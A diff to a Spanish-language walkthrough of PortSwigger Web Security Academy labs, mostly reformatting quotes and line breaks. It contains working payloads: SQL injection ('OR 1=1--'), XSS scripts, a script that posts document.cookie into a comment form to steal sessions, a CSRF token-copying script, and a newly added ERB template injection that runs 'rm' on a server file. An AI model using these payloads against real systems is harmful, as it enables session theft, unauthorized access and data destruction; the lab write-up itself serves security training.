@@ -38,10 +38,12 @@ Como el nombre de la categoría que se envía en la request no es sanitizado ant
 
 1. Seleccionar una categoría en el sitio vulnerable y examinar la request interceptada en Burp Suite.
 2. En la sentencia GET, modificar el parámetro `category` para que devuelva todos los registros de la tabla. Esto se puede lograr colocando una comilla simple para cerrar el string luego de `Accesories` (permitiendo insertar código SQL a continuación) y con una operación `OR 1=1`, lo que devuelve siempre `true`. Finalmente, se agrega el operador `--`, que comenta el resto de la consulta que está en el servidor. La petición debería quedar de la siguiente forma:
+
 ```
 GET /filter?category=Accesories'OR+1=1-- HTTP/1.1
 ...
 ```
+
 3. Por último, se envía la request, y el laboratorio estará resuelto.
 
 ### [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
@@ -156,7 +158,7 @@ Para resolver este lab, simplemente se escribe un script en el cuadro de búsque
 
 ```html
 <script>
-  alert("Hello World!");
+  alert('Hello World!');
 </script>
 ```
 
@@ -172,8 +174,7 @@ https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-con
 ### [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
 
 ```html
-&apos;&lt;img src="1" on&#101;rror=alert; throw
-document.cookie&lt;/img&gt;&apos;
+&apos;&lt;img src="1" on&#101;rror=alert; throw document.cookie&lt;/img&gt;&apos;
 ```
 
 ### [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
@@ -186,17 +187,17 @@ Por último, se debe cargar las cookies robadas en el navegador del atacante e i
 
 ```html
 <script>
-  document.addEventListener("DOMContentLoaded", function () {
+  document.addEventListener('DOMContentLoaded', function () {
     let cookie = document.cookie;
-    let comment = document.getElementsByName("comment")[0];
+    let comment = document.getElementsByName('comment')[0];
     comment.value = cookie;
-    let name = document.getElementsByName("name")[0];
-    name.value = "1337";
-    let email = document.getElementsByName("email")[0];
-    email.value = "1337@h4xx0r.com";
-    let website = document.getElementsByName("website")[0];
-    website.value = "https://mywebsite.com";
-    let form = document.getElementsByTagName("form")[0];
+    let name = document.getElementsByName('name')[0];
+    name.value = '1337';
+    let email = document.getElementsByName('email')[0];
+    email.value = '1337@h4xx0r.com';
+    let website = document.getElementsByName('website')[0];
+    website.value = 'https://mywebsite.com';
+    let form = document.getElementsByTagName('form')[0];
     form.submit();
   });
 </script>
@@ -214,9 +215,9 @@ Para resolver este lab, se escribe un Script que envía un mensaje HTTP, a la ub
   <input id="changeMe" required="" type="hidden" name="csrf" value="changeMe" />
 </form>
 <script>
-  document.addEventListener("DOMContentLoaded", (event) => {
-    let csrf = document.getElementById("changeMe");
-    let origCsrf = document.forms[1].getElementsByTagName("input")[0];
+  document.addEventListener('DOMContentLoaded', (event) => {
+    let csrf = document.getElementById('changeMe');
+    let origCsrf = document.forms[1].getElementsByTagName('input')[0];
     csrf.value = origCsrf.value;
     document.forms[0].submit();
   });
@@ -257,13 +258,7 @@ ${alert(1)}
 ### [Reflected XSS with event handlers and href attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)
 
 ```javascript
-<svg
-  width="120"
-  height="120"
-  viewBox="0 0 120 120"
-  version="1.1"
-  xmlns="http://www.w3.org/2000/svg"
->
+<svg width="120" height="120" viewBox="0 0 120 120" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <a>
     <text x="10" y="25" width="100" height="100">
       Hello
@@ -392,6 +387,16 @@ peter-bC8z09
 ---
 
 ## [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
+
+### [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
+
+### Descripción:
+
+Al ver los detalles de un producto sin stock, se muestra de forma insegura el mensaje pasado mediante el parámetro message en la URL, posibilitando pasar un parámetro que sea evaluado en el servidor por el template ERB.
+
+#### Solución:
+
+Hacer una request a https://LABID.web-security-academy.net/?message=<%=system("rm /home/carlos/morale.txt")%>
 
 ---
 
